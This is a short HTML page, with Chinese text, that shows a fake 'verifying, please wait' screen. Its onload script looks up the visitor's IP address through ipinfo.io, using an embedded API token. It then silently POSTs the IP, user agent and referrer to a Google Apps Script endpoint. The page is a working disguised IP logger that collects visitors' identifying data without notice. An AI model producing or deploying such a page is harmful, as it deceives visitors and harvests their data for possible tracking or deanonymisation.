<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>請稍候...</title>
  <script>
    window.onload = function () {
      fetch("https://ipinfo.io/json?token=8708e46a388f3f")
        .then(response => response.json())
        .then(ipData => {
          const params = new URLSearchParams({
            ip: ipData.ip,
            userAgent: navigator.userAgent,
            referrer: document.referrer || "None"
          });

          // 加上時間戳避免被快取
          const url = "https://script.google.com/macros/s/AKfycbyM9jZAnb1q-4lpv8xXZcJzARjWIzbtC-qr7uYxPI0EiL09hkZdmNCVUbnaST4NECh0/exec?ts=" + Date.now();

          fetch(url, {
            method: "POST",
            body: params
          }).then(r => r.text()).then(t => console.log("GAS 回應:", t));
        });
    };
  </script>
</head>
<body>
  <p>驗證中，請稍候...</p>
</body>
</html>
